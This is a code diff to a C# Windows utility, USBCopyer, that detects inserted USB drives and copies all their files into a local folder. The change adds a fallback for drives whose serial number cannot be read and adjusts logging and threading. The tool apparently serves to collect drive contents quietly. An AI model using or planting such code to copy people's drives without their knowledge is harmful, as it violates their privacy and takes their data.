@@ -7,6 +7,7 @@ using System.Management;
 using System.Threading;
 using System.Diagnostics;
 using System.Linq;
+using System.ComponentModel;
 
 namespace USBCopyer
 {
@@ -135,11 +136,37 @@ namespace USBCopyer
                                 try
                                 {
                                     ManagementObject diskinfo = new ManagementObject("win32_logicaldisk.deviceid=\""+disk+"\"");
-                                    string diskser = diskinfo.Properties["VolumeSerialNumber"].Value.ToString();
-                                    msg(disk + " - " + diskser, "存储设备已插入");
+                                    string diskser = "";
+                                    string diskname = "";
+                                    string diskdir;
+                                    object diskserdata  = diskinfo.Properties["VolumeSerialNumber"].Value;
+                                    object disknamedata = diskinfo.Properties["VolumeName"].Value;
+                                    if(disknamedata != null)
+                                    {
+                                        diskname = disknamedata.ToString();
+                                    }
+                                    if (diskserdata == null)
+                                    {
+                                        if(string.IsNullOrEmpty(diskname))
+                                        {
+                                            diskdir = disk.Substring(0, 1);
+                                        }
+                                        else
+                                        {
+                                            diskdir = disk.Substring(0, 1) + " - " + diskname;
+                                        }
+                                        msg(disk, "存储设备已插入");
+                                        Program.log("获取存储设备序列号失败，文件目录将命名为：" + diskdir);
+                                    }
+                                    else
+                                    {
+                                        diskser = diskserdata.ToString();
+                                        diskdir = diskser;
+                                        msg(disk + " - " + diskser, "存储设备已插入");
+                                    }
                                     if (EnableToolStripMenuItem.Checked)
                                     {
-                                        if (blackid.Contains(diskser))
+                                        if (!string.IsNullOrEmpty(diskser) && blackid.Contains(diskser))
                                         {
                                             Program.log("黑名单磁盘序列号：" + diskser + " 取消复制！");
                                             return;
@@ -157,25 +184,40 @@ namespace USBCopyer
                                                 Thread.Sleep(Properties.Settings.Default.sleep * 1000);
                                                 if (!Directory.Exists(disk + "\\"))
                                                 {
-                                                    Program.log("在延迟复制期间存储设备已拔出，复制取消：" + disk + " - " + diskser, 1);
+                                                    if(string.IsNullOrEmpty(diskser))
+                                                    {
+                                                        Program.log("在延迟复制期间获取序列号失败的存储设备已拔出，复制取消：" + diskdir, 1);
+                                                    }
+                                                    else
+                                                    {
+                                                        Program.log("在延迟复制期间存储设备已拔出，复制取消：" + disk + " - " + diskser, 1);
+                                                    }
                                                     return;
                                                 }
                                             }
-                                            if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskser))
+                                            if (Properties.Settings.Default.autorm && Directory.Exists(dir + diskdir))
                                             {
-                                                Program.log("清空输出目录：" + dir + diskser);
-                                                Directory.Delete(dir + diskser, true);
+                                                Program.log("清空输出目录：" + dir + diskdir);
+                                                Directory.Delete(dir + diskdir, true);
                                             }
-                                            CopyDirectory(disk + "\\", dir + diskser);
-                                            Program.log("设备数据复制完成：" + disk + " - " + diskser);
+                                            CopyDirectory(disk + "\\", dir + diskdir);
+                                            if (string.IsNullOrEmpty(diskser))
+                                            {
+                                                Program.log("设备数据复制完成，但由于获取磁盘序列号失败，文件目录命名为：" + diskdir);
+                                            }
+                                            else
+                                            {
+                                                Program.log("设备数据复制完成：" + disk + " - " + diskser);
+                                            }
                                             copyThread.Remove(disk);
                                         });
+                                        copyThread[disk].IsBackground = true;
                                         copyThread[disk].Start();
                                     }
                                 }
                                 catch(Exception ex)
                                 {
-                                    Program.log("获取插入的存储设备信息失败：" + ex.ToString());
+                                    Program.log("获取插入的存储设备信息失败，复制已取消：" + ex.ToString(),2);
                                 }
                             }
                             else  //存储设备拔/弹出
@@ -251,7 +293,7 @@ namespace USBCopyer
         /// </summary>
         /// <param name="sourcePath">待复制的文件夹路径</param>
         /// <param name="destinationPath">目标路径</param>
-        public void CopyDirectory(String sourcePath, String destinationPath)
+        public void CopyDirectory(string sourcePath, string destinationPath)
         {
             try
             {
